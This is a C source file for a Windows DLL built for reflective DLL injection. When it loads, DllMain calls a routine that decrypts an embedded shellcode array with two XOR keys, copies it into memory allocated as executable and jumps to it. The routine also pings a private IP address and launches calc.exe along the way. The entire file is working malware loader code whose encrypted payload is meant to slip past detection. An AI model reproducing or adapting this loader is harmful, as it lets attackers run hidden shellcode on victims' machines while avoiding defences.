#include <windows.h>
#include <stdio.h>

#include "shellcode_template.h"

#include "main.h"
#include "ReflectiveDLLInjection/dll/ReflectiveLoader.h"

extern HINSTANCE hAppInstance;

void drop_and_run() {

	int i, x;
	unsigned char decrypted_bytes[array_len+1] = {};
	
	system("cmd.exe /c ping -n 2 192.168.43.248");

	for (i = 0; i < array_len; i++) {
		if (sc_to_dump[i] == null_key) {
			decrypted_bytes[i] = 0x00;
			sc_to_dump[i] = '\0';
		} else if (sc_to_dump[i] != null_key) {
			decrypted_bytes[i] = key_one ^ sc_to_dump[i];
			decrypted_bytes[i] = key_two ^ decrypted_bytes[i];
			sc_to_dump[i] = '\0';										   
		}
	}
	
	system("calc.exe");

	void *exec = VirtualAlloc(0, sizeof decrypted_bytes, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	memcpy(exec, decrypted_bytes, sizeof decrypted_bytes);
	((void(*)())exec)();
}

BOOL WINAPI DllMain( HINSTANCE hinstDLL, DWORD dwReason, LPVOID lpReserved )
{
    BOOL bReturnValue = TRUE;
  switch( dwReason )
    {
    case DLL_QUERY_HMODULE:
      if( lpReserved != NULL )
        *(HMODULE *)lpReserved = hAppInstance;
      break;
    case DLL_PROCESS_ATTACH:
      hAppInstance = hinstDLL;
      drop_and_run();
      break;
    case DLL_PROCESS_DETACH:
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
            break;
    }
  return bReturnValue;
}
